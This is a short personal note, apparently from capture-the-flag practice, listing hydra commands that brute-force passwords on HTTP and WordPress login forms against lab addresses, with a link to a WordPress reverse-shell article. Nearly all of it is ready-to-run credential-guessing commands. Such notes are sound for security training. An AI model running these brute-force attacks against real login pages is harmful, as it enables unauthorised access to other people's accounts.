# hydra
```text-plain
hydra -l <user> -P <wordlist> <machine-ip> http-get /
hydra -l Elliot -P fsociety.dic 10.10.164.233 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

```text-plain
hydra -l 'adminaccount@itsupport.thm' -P word.txt 10.10.50.50 http-post-form '/login:email=^USER^&password=^PASS^:Invalid email' -I -t 64
```

It shows error and  “use http-get” but that doesn't work and this request finds the password.

wordpress hydra:

```text-plain
hydra -l <user> -P rockyou.txt 10.10.10.10 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -I -t 64
```

[https://www.hackingarticles.in/wordpress-reverse-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/)